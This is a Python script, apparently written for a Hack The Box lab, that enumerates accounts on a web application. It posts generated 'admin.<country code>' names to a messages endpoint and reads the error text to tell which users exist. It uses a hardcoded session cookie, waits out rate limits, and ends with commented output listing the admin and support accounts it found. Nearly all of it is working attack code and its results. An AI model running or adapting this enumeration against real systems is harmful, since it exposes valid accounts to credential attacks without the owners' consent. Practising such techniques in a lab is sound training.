import requests
import time
import sys

def obtain_file_content(file_path):
    file_content = []
    try:
        with open(file_path, 'r') as file:
            for line in file:
                file_content.append(line)
                # The 'with' statement ensures that the file is properly closed when done
    except FileNotFoundError:
        print(f"The file '{file_path}' does not exist.")
        file_content = "ERROR"
        sys.exit()
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        file_content = "ERROR"
        sys.exit()
    return file_content

def build_wordlist(usernames, country_codes):
    attack_wordlist = []
    for country_code in country_codes:
        attack_wordlist.append(("admin" + "." + country_code).strip("\n"))
    return attack_wordlist

COUNTRY_CODE_FILE_PATH = './country_codes.lst'
USERNAME_FILE_PATH = './top-usernames-shortlist.txt'

COUNTRY_CODES = obtain_file_content(COUNTRY_CODE_FILE_PATH)
USERNAMES = obtain_file_content(USERNAME_FILE_PATH)

ATTACK_WORDLIST = build_wordlist(USERNAMES, COUNTRY_CODES)

URL = "http://94.237.56.76:33659"
MESSAGES_ENDPOINT = "/messages.php"
HEADERS = {'Host': '94.237.56.76:33659', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate, br', 'Referer': 'Referer: 94.237.56.76:33659/support.php', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '38', 'DNT': '1', 'Connection': 'close', 'Cookie': 'htb_sessid=MDk4ZjZiY2Q0NjIxZDM3M2NhZGU0ZTgzMjYyN2I0ZjY%3D', 'Upgrade-Insecure-Requests': '1'}

print(ATTACK_WORDLIST)

print("\n=== Attack Started ===")

for target in ATTACK_WORDLIST:
    data = {'user': target, 'message': '123', 'submit': 'submit'}
    response = requests.post(URL + MESSAGES_ENDPOINT, headers=HEADERS, data=data)
    if response.status_code == 200:
        if "Cannot" in response.text:
            print(f"[-] User not found: {target}", end='\r')
        else:
            print(f"[+] Found user: {target}")
    else:
        print(response.status_code)
        print("Potential DDoS limit reached... Sleeping for 1min...")
        time.sleep(60)
        print("...yawn... Here we go agane!")
        
print("\n=== Attack Finished ===")


"""
=== Attack Started ===
[+] Found user: admin.cn
[+] Found user: admin.gr
[+] Found user: admin.it
[+] Found user: admin.uk
[+] Found user: admin.us
"""

"""
=== Attack Started ===
[+] Found user: support.cn
[+] Found user: support.gr
[+] Found user: support.it
[+] Found user: support.uk
[+] Found user: support.us
"""

